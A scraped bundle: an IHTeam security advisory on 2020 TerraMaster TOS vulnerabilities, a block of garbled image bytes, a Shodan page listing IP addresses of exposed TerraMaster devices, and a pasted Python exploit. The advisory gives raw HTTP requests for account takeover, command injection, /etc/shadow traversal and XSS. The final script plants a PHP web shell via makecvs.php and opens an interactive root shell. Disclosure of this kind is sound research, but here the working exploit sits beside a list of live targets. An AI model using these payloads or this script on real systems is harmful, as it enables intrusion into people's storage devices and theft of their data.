=== Content from www.ihteam.net_bb611acc_20250119_122725.html ===

[Skip to the content](#site-content)
[![IHTeam Security Blog](https://www.ihteam.net/wp-content/uploads/smlogo_2.png)](https://www.ihteam.net/)IHTeam Security Blog

Menu

* [Home](/)
* [Papers](https://www.ihteam.net/papers_tutorial/)

Close Menu

* [Home](/)
* [Papers](https://www.ihteam.net/papers_tutorial/)

Categories
[Advisories](https://www.ihteam.net/advisory/)
# TerraMaster TOS Multiple Vulnerabilities

* Post author

  By r00t
* Post date

  [12 December 2020](https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/)
* [2 Comments on TerraMaster TOS Multiple Vulnerabilities](https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/#comments)

TerraMaster is well known for producing data storage devices (NAS and DAS) since 2010. TOS is the name of their web interface to manage functionalities of the device.

The product is not new to security vulnerabilities, as Joshua M. of ISE highlighted back in 2018 (https://blog.securityevaluators.com/terramaster-nas-vulnerabilities-discovered-and-exploited-b8e5243e7a63).
In 2020, IHTeam performed a security review of the current TOS version 4.2.06 and identified the following:
CVE-2020-28184 – XSS
CVE-2020-28185 – User Enumeration
CVE-2020-28186 – Email Injection
CVE-2020-28187 – Directory Traversal
CVE-2020-28188 – Remote Command Execution
CVE-2020-28190 – Software Update Man-in-the-middle
CVE-2020-29189 – Incorrect Access Control

At the moment of writing Shodan has found around 1000 vulnerable TOS exposed on Internet – <https://www.shodan.io/search?query=X-Powered-By%3A+TerraMaster>

## **Account Takeover**

CVE-2020-28186 – The Forget Password functionality was found to be vulnerable to email injection, allowing an attacker to receive a verification code to a third-party email. This attack only works if the user specified a ‘Security email’ on the account.

The first step is to identify valid account (CVE-2020-28185) with security email set via:

`POST /wizard/initialise.php HTTP/1.1
Host: 192.168.1.206:8181
Content-Length: 28
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.1.206:8181

tab=checkuser&username=testaccount`

The response will look like the following:
`{"username":"testaccount","email":"[[email protected]](/cdn-cgi/l/email-protection)","status":1}`

We can now proceed requesting the password reset code via:

`POST /wizard/initialise.php HTTP/1.1
Host: 192.168.1.206:8181
Content-Length: 41
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.1.206:8181
Referer: http://192.168.1.206:8181/wizard/getpass.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

tab=validmail&email=<valid_user@email>,<attacker_controlled@email>`

Both user and attacker will receive the verification code thanks to email injection (comma separated emails); At this point we can validate the code (the cookie value must be lowercase):

`POST /wizard/initialise.php HTTP/1.1
Host: 192.168.1.206:8181
Content-Length: 25
Accept: /
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.1.206:8181
Referer: http://192.168.1.206:8181/wizard/getpass.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: check_mail=frskzi
Connection: close

tab=checkcode&code=FrSkzI`

And finally reset the user’s password via:

`POST /wizard/initialise.php HTTP/1.1
Host: 192.168.1.206:8181
Content-Length: 82
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.1.206:8181
Referer: http://192.168.1.206:8181/wizard/getpass.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: check_mail=frskzi
Connection: close

tab=checkpass&username=testaccount&email=<valid_user@email>&code=FrSkzI&passwd=NewPassw0rdH3r3`

## **Unauthenticated Remote Command Execution**

CVE-2020-28188
Vulnerable page: */include/makecvs.php*
Vulnerable parameter: *Event*

Proof of Concept:
`GET /tos/index.php?explorer/pathList&path=%60touch%20/tmp/file%60 HTTP/1.1
Host: 192.168.1.206:8181`

![](https://www.ihteam.net/wp-content/uploads/Touch_file.jpg)

Full exploit available at: <https://iht.li/paste.php?hash=UEUS>

## **Weak Access Control List**

CVE-2020-29189 – When a user is created, it could be placed within a group having read-only access to NAS folders. It was found that this option could be bypassed via the following request:

`POST /tos/index.php?explorer/pathChmod HTTP/1.1
Host: 192.168.1.206:8181
Content-Length: 162
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.1.206:8181
Referer: http://192.168.1.206:8181/tos/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=9ef919de5a6d2b17f5b6a5549e45495e; tos_visit_time=1604152180; kod_name=testaccount; noshow=1; kod_user_language=it-it
Connection: close

list=[{"type":"folder","path":"Volume%2520%25231%252Fpublic%252FISO%252F","userlist":"admin,testaccount,user,@admin,@allusers","right":"2,2,2,2,2","appmode":"0"}]`

The ‘right’ array refers to the ‘userlist’ array, therefore a value of ‘2’ will grand read/write access, instead of ‘1’ that only grants read access.

## **Directory Traversal**

CVE-2020-28187 – Instances of directory traversal leading to internal file system disclosure were identified. For example the following authenticated request can be performed to read the /etc/shadow file:

`GET /tos/index.php?editor/fileGet&filename=../../../../../../etc/shadow HTTP/1.1
Host: 192.168.1.206:8181
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=xxxxxxxxxxxx;
Connection: close`

The nginx web server was running with root privileges, that’s why it was possible to read the shadow file.

## **Cross-Site Scripting**

CVE-2020-28184
XSS via Host header on port 80 (unauthenticated)
`GET / HTTP/1.1
Host: 192.168.1.206'-alert(1)-'`

Via GET (authenticated)
`GET /module/index.php?mod=%2fusr%2fwww%2fmod%2f5.%22-alert(1)-%22 HTTP/1.1
Host: 192.168.1.206:8181`

## **Software update via insecure communication channel**

CVE-2020-28190 – In addition, software update and applications are checked and delivered via un-encrypted communication channel (HTTP):
`"AmazonS3":
{
"url":"http:\/\/dl.terra-master.com\/cn\/TOS7.0CJ\/AmazonS3.bz2"`

This behavior would allow man-in-the-middle attacks to successfully install malicious applications or updates.

## **Responsible Disclosure timeline:**

2 Nov 2020 – Details sent to TerraMaster Team and CVE request submitted
17 Nov 2020 – TerraMaster confirms that fixes will be implemented in version 4.2.07
3 Dec 2020 – TerraMaster releases TOS 4.2.07
9 Dec 2020 – IHTeam confirms issues were fixed in 4.2.07
12 Dec 2020 – IHTeam releases a public disclosure article

---

[←
DEFCON 28 – Safe mode](https://www.ihteam.net/hack-meet/defcon-28-safe-mode/)
[→
OnionShare 2.3 >= 2.3.3 Vulnerabilities](https://www.ihteam.net/advisory/onionshare/)

---

## 2 replies on “TerraMaster TOS Multiple Vulnerabilities”

![](https://secure.gravatar.com/avatar/53eaef94379535acdf3506a9c69be6cc?s=120&d=mm&r=g)Juniorsays:
[16 June 2022 at 12:59](https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/#comment-1471)

Congrats for your findings! I have a question about CVE-2020-28188. Is it the same as CVE-2020-35665? What is the difference?

In this article you say the vulnerable page is “/include/makecvs.php” and the vulnerable parameter is “Event”, but as a PoC you use “/tos/index.php?explorer/pathList&path=…”. In the exploit that you share you are only referencing the “makecvs” file. Is it a mistake?

Thanks!

[Reply](#comment-1471)

![](https://secure.gravatar.com/avatar/586f57e8e7bad3b0e6473a2038581861?s=120&d=mm&r=g)r00tsays:
[10 July 2022 at 16:19](https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/#comment-1472)

Hello, CVE-2020-35665 was created on the 22nd of December and based on a replica of our original exploit (released on 2nd of November).

CVEs can be requested by researchers at any time. MITRE won’t check for duplicates.

Regarding your question about the vulnerable path, they both are vulnerable to RCE, but “/include/makecvs.php?Event=” was instead used for the exploit.

In fact, there was also another path vulnerable to RCE (required auth): ajax/logtable.php

[Reply](#comment-1472)By Post Author

---

## Leave a Reply [Cancel reply](/advisory/terramaster-tos-multiple-vulnerabilities/#respond)

Your email address will not be published. Required fields are marked \*

Comment \*

Name \*

Email \*

Website

 Save my name, email, and website in this browser for the next time I comment.

Δ

This site uses Akismet to reduce spam. [Learn how your comment data is processed](https://akismet.com/privacy/).

©
2025 [IHTeam Security Blog](https://www.ihteam.net/)

[Powered by WordPress](https://en-gb.wordpress.org/)

[To the top ↑
Up ↑](#site-header)



=== Content from www.ihteam.net_98874e00_20250119_140533.html ===
���� JFIF  x x  �� C 



�� C  

��  �" ��           
�� �   } !1AQa"q2���#B��R��$3br�
%&'()\*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz���������������������������������������������������������������������������        
�� �  w !1AQaq"2�B���� #3R�br�
$4�%�&'()\*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������   ? ���
� '��'���� �Xk�������'�|s�c|P��~�|A-�ͳL�]��-6��X"���ҼU�}��/UӠ񶋯xR���n��Y�0F��9LbB28�#�G`9�+�|y����u-�ǷZ����a���h��)���p�\_f<��y��� ��o����%��/��U]|O��6�d�?f;�����m��F���W<������0�Ds\_�W�^&��f�;mJ�E��eV �UoU�<d����S�  � |�k�G��Ǖ!�;�0��E�˶uy#x����y)� y��j^ ���:��Z�� �u{�d����y"��@!�Ug2��v2�Ә�E��>;�&��x+�Z6�U��Pҧ�$��� 穠~G%Ew+��c[��w�nS���a\gvvc�5k�� |;����⫝MXEձ҄�$r� ��JJ����2�B<��Sᮡ�r���6zǎ���9��<�tA�;f�7�`ۗ�e%xb\*
C�?��\_Oү��-SQ,,�n4���o-�Mώ�A���h���|w�=.MO\�W��m6"�%桥O(I�� $�S\� Q]/��Z'�M6��j�i��R��H�u˄��21 u���\#�%�N\�r}j��~+�����ciiv��k7�E(#E�ª��   ��Z������Q哏`��Z\_�� ��ǆ5�� �YZ�"�-�o� c��#:��\_ 0�ጄt��M7�����5?���J�S26����ז$��i�̚�]F1��Q�l��8J+��"h����!�~���)m��M>��5й�̶D�c$`����d�-��>�Լ7�n���3W�Kq}��{�l����ho�Dr&#l���V�1s����j)>T�o�N��^���>�C��E7S��}��ST�o���\*Kk�iKc ��X��l�`��N�oS������^�������x��<|��o�ӥ�`.����6� 3?&|���ݷ�<3�� ��\_o��wV׬5�u�k9$�ѣ���張
yp�%b̪�T( 4�7�����}��(��jQ�E�\���\ج� �����Y�;�$u�S֫�QE QE Q]\_�����W�t[��e{W
�T�{�ut%A��
J?��
|I��iZF�u��Z}���6O�NeV�C��D!�����C�\_���������뽼��+����W[����^�� ���n5 �为0�6V�\*N|�VD�(�TI��F� �\_���]R��~'�Q^����[Ǟ"� ��^�"��c��=��O<>b"$���߼<Ȋ#߆����oY�'������¾"�{]a�3[�+F+��a �cm�#���B���Ij
���+��V����x?�Z��5� �-W����B�M��W"6av|�\_-���F���^UR���\_���SMo�[@��?��Ս���4��J��
N��B���p���ф.�c��pdU|�b8�C�����L��ۀ-��\�%��ـm��<t���IdSV���� �B/t�go�?���R���ä��]����
~�GK�T�ƚt�d���-��a�?��/!��j{��\_qo@��>���X�5�z��\�k���qgn|��n����w2+ݰ����\_Gk��R����r�.�t�/�U��Z��]�۬R�򿘻A��Dr3�E5g$�[�Jߚ&>�]o�7�L�Z+��4e���l<[�Xh6��G��SK�ѭb��Yg�uEd(U�@2�M\���t=s�f��MQ�� ͪ�����p��F�FYA���%��� ����7k�\_�����GPԣ����Ě�֕�i�Z
��I�a����Uhd1���BM�����M�����=A>�p�b�:���N�?l����>I,�h��o��\_�iG�������(��+�u�߇~�$�y�#$���[]K��>��
��~����i����ޱ���$�+����9��]�>�߃������ �� ?���^��j]�kus��Q�X���Cwg��[NЋV;d�(ե�Y�y&���8�����^�uk��c�L�h<7�IuX�5s����W�T;m\�2��^��k~)?Ԕ�����3Eox������j^�e팁�dܥC+m`r��k �8 ���N�覬�}�  � ����� \_p�,5�:4�t��������{;����#G S�rQ�ݿ��x?���%��|�#�����C�n��/ú����N�\5��Bmڑ��L�!NK���r;�?������i'ð�І�%7Gx�/%uP� '�ߓ��W�QJ�8�����p����v� |o��=�7�֭�\_�r����g�%����7/� w|��6��sҸ�)���k�
�PW�����v>X
��G{)|��t�1������(���~>����]\_����5�NmZHd����a�Q�4a�����r͜q��(k綒���6��1O(�DL���C0PO8\*(��(�������{�iZ��%d�;Q�Ʉ�����M��� =k���2q|�re%��:ω�)�bi�:f��2�N�F�B�L�0�R�'#-B=��jږ�� х���e�G��.M�ڋd��L�ɴ�S,��f�����G��u]Lд�4}H�K�{[��u<��S̖iBF�j6���3�x�)���[����z7��!xO�
�j6�
���z�ɻ����^�y��m�X���J��1��4QR����|%������Z����rGo���j��xܾ�%��ۂ9�J�h�ag�M/¾3�ּ)�^Y�CE5��~��hWW�dg�>G���.FI����Oǚ���M/�^��N���֥����eE�B)tF;���FG9��:��A�G��O7������j?�k�t&����g�� ]�;q���|u�i~�|?�]
�\��-�k
HY\G<K\*���YJ�����a��(���� +�&Դ�\_\��Ҵx�=ʈt���q
/!,�q��I�Q�2袒�XaES ��(Gú��u�;YӤ������dF2;�����'�4i�7w��\_@��,���5��"�hÈ���c��S#����ۖ;Ep�P�Va��W������F��[����u��U�[k�+;�-��|7�k��֞�Y�qZD�O��ZJw�X�ߎ�/��焬��H��Z�Q��Wm�-�yw֜�2αylݎ� ��j\*�|�V�Yw���@�寊��-'H�\_D���n����u��٤r��,�33c�EP  u'��������o����� x���+�/�p���0Da8���vn'�7�9�������t{�{òަ�6Z�����P�2Hb�J���v�H煢��m���6���M��]?]� 6v:��������;Ғ�:k�C��k�SYh:������gq��-̧�c�Z\*�:pc~�׎��7��!�-'L�N𾷥j:m�:u��ֽ
�>Tl�/��Y�f�q�c�T����[��SO����g����%05��&�x��7�"1�����v�� j�t� xQ𾙣��×��i\*�X\_�Z��ΐ���d���ٗ
�7���QU}[��i�i�-�]�������\��i��Nߺ��W�F� 2�K18�<��� Q��C?��

=== Content from www.shodan.io_142c2b3a_20250119_140532.html ===


* [Shodan](https://www.shodan.io)
* [Maps](https://maps.shodan.io)
* [Images](https://images.shodan.io)
* [Monitor](https://monitor.shodan.io)
* [Developer](https://developer.shodan.io)
* [More...](https://www.shodan.io/about/products)

[![Shodan](https://www.shodan.io/static/img/logo-6abcc86b.png)](/)

* [Explore](/explore)
* [Pricing](https://account.shodan.io/billing)

* [Login](/dashboard)

###### Total Results

#### 208

###### Top Countries

* [United States](/search?query=X-Powered-By%3A+TerraMaster+country%3A%22US%22)54
* [China](/search?query=X-Powered-By%3A+TerraMaster+country%3A%22CN%22)48
* [United Kingdom](/search?query=X-Powered-By%3A+TerraMaster+country%3A%22GB%22)28
* [Germany](/search?query=X-Powered-By%3A+TerraMaster+country%3A%22DE%22)12
* [Japan](/search?query=X-Powered-By%3A+TerraMaster+country%3A%22JP%22)11
* [More...](/search/facet?query=X-Powered-By%3A+TerraMaster&facet=country)

###### Top Ports

* [8181](/search?query=X-Powered-By%3A+TerraMaster+port%3A8181)171
* [5443](/search?query=X-Powered-By%3A+TerraMaster+port%3A5443)27
* [9000](/search?query=X-Powered-By%3A+TerraMaster+port%3A9000)4
* [81](/search?query=X-Powered-By%3A+TerraMaster+port%3A81)1
* [2626](/search?query=X-Powered-By%3A+TerraMaster+port%3A2626)1
* [More...](/search/facet?query=X-Powered-By%3A+TerraMaster&facet=port)

###### Top Organizations

* [China Unicom Shandong province network](/search?query=X-Powered-By%3A+TerraMaster+org%3A%22China+Unicom+Shandong+province+network%22)11
* [Charter Communications Inc](/search?query=X-Powered-By%3A+TerraMaster+org%3A%22Charter+Communications+Inc%22)8
* [CHINANET Shanghai province network](/search?query=X-Powered-By%3A+TerraMaster+org%3A%22CHINANET+Shanghai+province+network%22)5
* [Vodafone Limited](/search?query=X-Powered-By%3A+TerraMaster+org%3A%22Vodafone+Limited%22)5
* [CHINANET SHANXI PROVINCE NETWORK](/search?query=X-Powered-By%3A+TerraMaster+org%3A%22CHINANET+SHANXI+PROVINCE+NETWORK%22)4
* [More...](/search/facet?query=X-Powered-By%3A+TerraMaster&facet=org)

[View Report](/search/report?query=X-Powered-By%3A+TerraMaster)
[View on Map](https://maps.shodan.io/#16.720385051693988/3.515625/3/satellite/X-Powered-By:%20TerraMaster)[Advanced Search](/search/advanced?query=X-Powered-By:%20TerraMaster)

**Product Spotlight:**We've Launched a new API for Fast Vulnerability Lookups. Check out [CVEDB](https://cvedb.shodan.io)

2025-01-19T07:27:14.255431
[222.191.194.252](/host/222.191.194.252)

* [CHINANET jiangsu province network](/search?query=X-Powered-By%3A+TerraMaster+org%3A%22CHINANET+jiangsu+province+network%22)
* ![](https://www.shodan.io/static/flags/16/CN-2531ec37.png "China")[China](/search?query=X-Powered-By%3A+TerraMaster+country%3A%22CN%22), [Shanghai](/search?query=X-Powered-By%3A+TerraMaster+city%3A%22Shanghai%22)

```
HTTP/1.1 200 OK
Date: Sun, 19 Jan 2025 07:27:13 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: close
X-Powered-By: TerraMaster
Server: TOS/1.18.0
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cross-Origin-R...
```

2025-01-19T03:00:18.954694
[185.7.114.219](/host/185.7.114.219)

* 185-7-114-219.ip272.fastwebnet.it
* [Fastweb SpA](/search?query=X-Powered-By%3A+TerraMaster+org%3A%22Fastweb+SpA%22)
* ![](https://www.shodan.io/static/flags/16/IT-35bfe307.png "Italy")[Italy](/search?query=X-Powered-By%3A+TerraMaster+country%3A%22IT%22), [Milan](/search?query=X-Powered-By%3A+TerraMaster+city%3A%22Milan%22)

```
HTTP/1.1 200 OK
Date: Sun, 19 Jan 2025 02:59:52 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: close
X-Powered-By: TerraMaster
Server: TOS/1.16.1
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cross-Origin-R...
```

2025-01-19T00:34:44.220718
[47.207.14.15](/host/47.207.14.15)

* static-47-207-14-15.tamp.fl.frontiernet.net
* [Frontier Communications of America, Inc.](/search?query=X-Powered-By%3A+TerraMaster+org%3A%22Frontier+Communications+of+America++Inc.%22)
* ![](https://www.shodan.io/static/flags/16/US-b4018137.png "United States")[United States](/search?query=X-Powered-By%3A+TerraMaster+country%3A%22US%22), [Temple Terrace](/search?query=X-Powered-By%3A+TerraMaster+city%3A%22Temple+Terrace%22)

```
HTTP/1.1 200 OK
Date: Sun, 19 Jan 2025 00:34:39 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: close
X-Powered-By: TerraMaster
Server: TOS/1.16.1
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cross-Origin-R...
```

2025-01-18T20:22:46.234987
[124.128.168.124](/host/124.128.168.124)

* [China Unicom Shandong province network](/search?query=X-Powered-By%3A+TerraMaster+org%3A%22China+Unicom+Shandong+province+network%22)
* ![](https://www.shodan.io/static/flags/16/CN-2531ec37.png "China")[China](/search?query=X-Powered-By%3A+TerraMaster+country%3A%22CN%22), [Qingdao](/search?query=X-Powered-By%3A+TerraMaster+city%3A%22Qingdao%22)

```
HTTP/1.1 200 OK
Date: Sat, 18 Jan 2025 20:22:46 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: close
X-Powered-By: TerraMaster
Server: TOS/1.12.1
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cross-Origin-R...
```

2025-01-18T17:24:43.867796
[199.19.62.44](/host/199.19.62.44)

* srv-199-19-62-44.highspeedcrow.ca
* [Valley Fiber Ltd.](/search?query=X-Powered-By%3A+TerraMaster+org%3A%22Valley+Fiber+Ltd.%22)
* ![](https://www.shodan.io/static/flags/16/CA-b2b37979.png "Canada")[Canada](/search?query=X-Powered-By%3A+TerraMaster+country%3A%22CA%22), [Selkirk](/search?query=X-Powered-By%3A+TerraMaster+city%3A%22Selkirk%22)

```
HTTP/1.1 403 Forbidden
Date: Sat, 18 Jan 2025 17:26:19 GMT
Content-Type: text/html
Content-Length: 153
Connection: close
X-Powered-By: TerraMaster
Server: TNAS-00EC40

<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.1...
```

2025-01-18T15:24:32.678976
[185.215.14.167](/host/185.215.14.167)

* 167-14-215-185.ftth.cust.kwaoo.net
* [K-NET SARL](/search?query=X-Powered-By%3A+TerraMaster+org%3A%22K-NET+SARL%22)
* ![](https://www.shodan.io/static/flags/16/FR-d1fa7d03.png "France")[France](/search?query=X-Powered-By%3A+TerraMaster+country%3A%22FR%22), [Épinay-sur-Orge](/search?query=X-Powered-By%3A+TerraMaster+city%3A%22%C3%89pinay-sur-Orge%22)

```
HTTP/1.1 403 Forbidden
Date: Sat, 18 Jan 2025 15:24:32 GMT
Content-Type: text/html
Content-Length: 153
Connection: close
X-Powered-By: TerraMaster
Server: TNAS

<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.16.1</ce...
```

2025-01-18T15:02:27.627821
[73.204.222.236](/host/73.204.222.236)

* c-73-204-222-236.hsd1.fl.comcast.net
* [Comcast IP Services, L.L.C.](/search?query=X-Powered-By%3A+TerraMaster+org%3A%22Comcast+IP+Services++L.L.C.%22)
* ![](https://www.shodan.io/static/flags/16/US-b4018137.png "United States")[United States](/search?query=X-Powered-By%3A+TerraMaster+country%3A%22US%22), [Pembroke Pines](/search?query=X-Powered-By%3A+TerraMaster+city%3A%22Pembroke+Pines%22)

```
HTTP/1.1 502 Bad Gateway
Date: Sat, 18 Jan 2025 15:01:59 GMT
Content-Type: text/html
Content-Length: 157
Connection: close
X-Powered-By: TerraMaster
Server: TOS/1.16.1

<html>
<head><title>502 Bad Gateway</title></head>
<body>
<center><h1>502 Bad Gateway</h1></center>
<hr><center>ngin...
```

2025-01-18T07:57:52.936191
[78.130.251.3](/host/78.130.251.3)

* clients-pools.pl.cooolbox.bg
* [Cooolbox Network](/search?query=X-Powered-By%3A+TerraMaster+org%3A%22Cooolbox+Network%22)
* ![](https://www.shodan.io/static/flags/16/BG-ef77bd94.png "Bulgaria")[Bulgaria](/search?query=X-Powered-By%3A+TerraMaster+country%3A%22BG%22), [Plovdiv](/search?query=X-Powered-By%3A+TerraMaster+city%3A%22Plovdiv%22)

```
HTTP/1.1 200 OK
Date: Sat, 18 Jan 2025 07:57:53 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: close
X-Powered-By: TerraMaster
Server: TNAS-00B65E
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cross-Origin-...
```

2025-01-18T05:43:59.643194
[75.128.134.27](/host/75.128.134.27)

* syn-075-128-134-027.res.spectrum.com
* [Charter Communications](/search?query=X-Powered-By%3A+TerraMaster+org%3A%22Charter+Communications%22)
* ![](https://www.shodan.io/static/flags/16/US-b4018137.png "United States")[United States](/search?query=X-Powered-By%3A+TerraMaster+country%3A%22US%22), [Monroe](/search?query=X-Powered-By%3A+TerraMaster+city%3A%22Monroe%22)

```
HTTP/1.1 403 Forbidden
Date: Sat, 18 Jan 2025 05:43:58 GMT
Content-Type: text/html
Content-Length: 169
Connection: close
X-Powered-By: TerraMaster
Server: TOS/1.12.1

<html>
<head><title>403 Forbidden</title></head>
<body bgcolor="white">
<center><h1>403 Forbidden</h1></center>
<hr><c...
```

2025-01-18T00:49:34.004672
[116.68.223.251](/host/116.68.223.251)

* ppxf251.entn.cli.wbs.ne.jp
* [TOKAI Communications Corporation](/search?query=X-Powered-By%3A+TerraMaster+org%3A%22TOKAI+Communications+Corporation%22)
* ![](https://www.shodan.io/static/flags/16/JP-ede9898b.png "Japan")[Japan](/search?query=X-Powered-By%3A+TerraMaster+country%3A%22JP%22), [Shizuoka](/search?query=X-Powered-By%3A+TerraMaster+city%3A%22Shizuoka%22)

```
HTTP/1.1 200 OK
Date: Sat, 18 Jan 2025 00:49:33 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: close
X-Powered-By: TerraMaster
Server: TOS/1.16.1
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cross-Origin-R...
```

[Next](/search?query=X-Powered-By%3A+TerraMaster&page=2)

###### Products

* [Monitor](https://monitor.shodan.io)
* [Search Engine](https://beta.shodan.io)
* [Developer API](https://developer.shodan.io)
* [Maps](https://maps.shodan.io)

######

* [Bulk Data](https://enterprise.shodan.io)
* [Images](https://images.shodan.io)
* [Snippets](https://snippets.shodan.io)

###### Pricing

* [Membership](https://www.shodan.io/store/member)
* [API Subscriptions](https://developer.shodan.io/pricing)
* [Enterprise](https://enterprise.shodan.io)

###### Contact Us

* support@shodan.io
* #####

Shodan ® - All rights reserved



=== Content from iht.li_006d6bdd_20250119_140533.html ===

[Home](/) |
[Raw](/raw/UEUS) |
[Download](/dl/UEUS)

  Author: IHTeam

  Submission data: 2020-11-13

  Code type: python
```

1. #!/usr/bin/env python3
2. import argparse
3. import requests
4. import time
5. import sys
6. import urllib.parse
7. from requests.packages.urllib3.exceptions import InsecureRequestWarning
9. requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
11. parser = argparse.ArgumentParser(description="TerraMaster TOS <= 4.2.06 Unauth RCE")
12. parser.add_argument('--url', action='store', dest='url', required=True, help="Full URL and port e.g.: http://192.168.1.111:8081/")
13. args = parser.parse_args()
15. url = args.url
16. headers = {'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'}
17. epoch_time = int(time.time())
18. shell_filename = "debug"+str(epoch_time)+".php"
20. def check_endpoint(url, headers):
21. response = requests.get(url+'/version', headers=headers, verify=False)
22. if response.status_code == 200:
23. print("[+] TerraMaster TOS version: ", str(response.content))
24. else:
25. print("\n[-] TerraMaster TOS response code: ", response.status_code)
26. sys.exit()
28. def upload_shell(url, headers, shell_filename):
29. payload = "http|echo \"<?php echo(passthru(\\$_GET['cmd']));?>\" >> /usr/www/"+shell_filename+" && chmod +x /usr/www/"+shell_filename+"||"
30. payload = urllib.parse.quote(payload, safe='')
31. print("[/] Uploading shell...")
32. response = requests.get(url+'/include/makecvs.php?Event='+payload, headers=headers, verify=False)
33. time.sleep(1)
34. response = requests.get(url+'/'+shell_filename+'?cmd=id', headers=headers, verify=False)
35. if ('uid=0(root) gid=0(root)' in str(response.content, 'utf-8')):
36. print("[+] Upload succeeded")
37. else:
38. print("\n[-] Error uploading shell: ", response.content)
39. sys.exit()
41. def interactive_shell(url, headers, shell_filename, cmd):
42. response = requests.get(url+'/'+shell_filename+'?cmd='+urllib.parse.quote(cmd, safe=''), headers=headers, verify=False)
43. print(str(response.text)+"\n")
46. def delete_shell(url, headers, shell_filename):
47. delcmd = "rm /usr/www/"+shell_filename
48. response = requests.get(url+'/'+shell_filename+'?cmd='+urllib.parse.quote(delcmd, safe=''), headers=headers, verify=False)
49. print("\n[+] Shell deleted")
51. check_endpoint(url, headers)
52. upload_shell(url, headers, shell_filename)
53. try:
54. while True:
55. cmd = input("# ")
56. interactive_shell(url, headers, shell_filename, cmd)
57. except:
58. delete_shell(url, headers, shell_filename)

```


